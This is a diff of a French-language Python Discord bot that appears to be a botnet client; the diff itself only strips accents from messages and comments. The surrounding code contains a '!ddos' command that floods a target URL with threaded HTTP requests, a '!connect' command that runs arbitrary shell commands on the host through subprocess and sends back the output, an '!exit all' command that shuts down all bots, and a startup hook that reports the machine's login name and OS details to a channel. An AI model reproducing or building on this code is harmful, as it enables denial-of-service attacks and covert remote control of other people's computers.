@@ -44,7 +44,7 @@ async def ddos(ctx, *, user_input):
         except requests.exceptions.RequestException as e:
             pass
 
-    # Lancer plusieurs threads pour envoyer des requêtes simultanément
+    # Lancer plusieurs threads pour envoyer des requêtes simultanement
     threads = []
     def start(url = "",nbrDdosHttpRequest=100):
         for i in range(nbrDdosHttpRequest):
@@ -57,7 +57,7 @@ async def ddos(ctx, *, user_input):
         thread.join()
     
 
-    await ctx.send("attaque terminé")
+    await ctx.send("attaque termine")
 
 @bot.command()
 async def user(ctx):
@@ -77,7 +77,7 @@ async def exit(ctx, *, user_input):
             await bot.close()
         try:
             if listeMots[0] == "all" and not listeMots[1] == "confirm":
-                await ctx.send(f"pour confirmer l'arret de tout les bots veuillez écrire !exit all confirm")
+                await ctx.send(f"pour confirmer l'arret de tout les bots veuillez ecrire !exit all confirm")
         except:
             pass
         if listeMots[0] == "all" and listeMots[1] == "confirm":
@@ -103,33 +103,33 @@ async def connect(ctx, *, user_input):
                 if os.path.exists(directory):
                     os.chdir(directory)
                     current_directory = os.getcwd()
-                    await ctx.send(f"Répertoire changé vers {current_directory}")
+                    await ctx.send(f"Repertoire change vers {current_directory}")
                 else:
-                    await ctx.send(f"Le répertoire {directory} n'existe pas.")
+                    await ctx.send(f"Le repertoire {directory} n'existe pas.")
             except Exception as e:
-                await ctx.send(f"Erreur lors du changement de répertoire : {str(e)}")
+                await ctx.send(f"Erreur lors du changement de repertoire : {str(e)}")
         else:
             if "pwd" in Executecommand:
                 await ctx.send(f"{current_directory}")
             else:
                 try:
-                    # Utiliser un encodage adapté pour Windows (comme 'cp1252' ou 'mbcs')
+                    # Utiliser un encodage adapte pour Windows (comme 'cp1252' ou 'mbcs')
                     output = subprocess.check_output(Executecommand, shell=True, stderr=subprocess.STDOUT, cwd=current_directory)
-                    decoded_output = output.decode('cp1252').strip()  # Utiliser un encodage adapté ici
+                    decoded_output = output.decode('cp1252').strip()  # Utiliser un encodage adapte ici
                     if decoded_output:
                         await ctx.send(f"{decoded_output}")
                     else:
                         await ctx.send("La commande n'a produit aucune sortie.")
                 except subprocess.CalledProcessError as e:
-                    await ctx.send(f"Erreur lors de l'exécution de la commande: {e.output.decode('cp1252')}")
+                    await ctx.send(f"Erreur lors de l'execution de la commande: {e.output.decode('cp1252')}")
                 except UnicodeDecodeError as e:
-                    await ctx.send(f"Erreur de décodage: {str(e)}")
+                    await ctx.send(f"Erreur de decodage: {str(e)}")
                     
 @bot.event
 async def on_ready():
     channel = discord.utils.get(bot.get_all_channels(), name='chat')  # Remplacez 'chat' par le nom de votre canal
     if channel:
-        await channel.send("__***User connecté;***__")
+        await channel.send("__***User connecte;***__")
         await channel.send(os.getlogin())
         await channel.send(platform.system())
         await channel.send(platform.version())
